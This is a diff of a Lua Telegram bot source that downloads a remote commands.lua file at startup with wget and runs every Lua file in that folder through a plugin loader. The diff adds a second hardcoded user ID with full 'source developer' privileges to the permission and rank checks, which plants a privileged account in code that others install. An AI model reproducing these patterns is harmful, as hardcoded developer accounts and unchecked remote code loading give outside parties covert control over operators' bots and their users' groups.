@@ -156,9 +156,6 @@ token = sudos.token
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
 io.popen("mkdir File_Bot") 
-io.popen("cd File_Bot && rm -rf commands.lua.1") 
-io.popen("cd File_Bot && rm -rf commands.lua.2") 
-io.popen("cd File_Bot && rm -rf commands.lua.3") 
 io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MASTRTEAM/Files_MASTR/master/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
@@ -172,7 +169,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,554921096}
+sudo_users = {SUDO,554921096,665877797}
 function SudoBot(msg)  
 local MASTR = false  
 for k,v in pairs(sudo_users) do  
@@ -235,6 +232,8 @@ if tonumber(user_id) == tonumber(554921096) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
+elseif tonumber(user_id) == tonumber(665877797) then
+var = true  
 elseif database:sismember(bot_id..'Sudo:User', user_id) then
 var = true  
 elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
@@ -255,6 +254,8 @@ end
 
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(554921096) then  
+var = 'مطور السورس👨‍🔧'
+elseif tonumber(user_id) == tonumber(665877797) then
 var = 'مطور السورس👨‍🔧'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي👨‍💻'  
@@ -652,12 +653,12 @@ return false
 end
 end,nil)   
 end  
-function plugin_Poyka(msg)
+function plugin_Mastra(msg)
 for v in io.popen('ls File_Bot'):lines() do
 if v:match(".lua$") then
 plugin = dofile("File_Bot/"..v)
-if plugin.Poyka and msg then
-pre_msg = plugin.Poyka(msg)
+if plugin.Mastra and msg then
+pre_msg = plugin.Mastra(msg)
 end
 end
 end
@@ -8786,7 +8787,7 @@ end
 end   
 --------------------------------------------------------------------------------------------------------------
 SourceMASTR(data.message_,data)
-plugin_Poyka(data.message_)
+plugin_Mastra(data.message_)
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
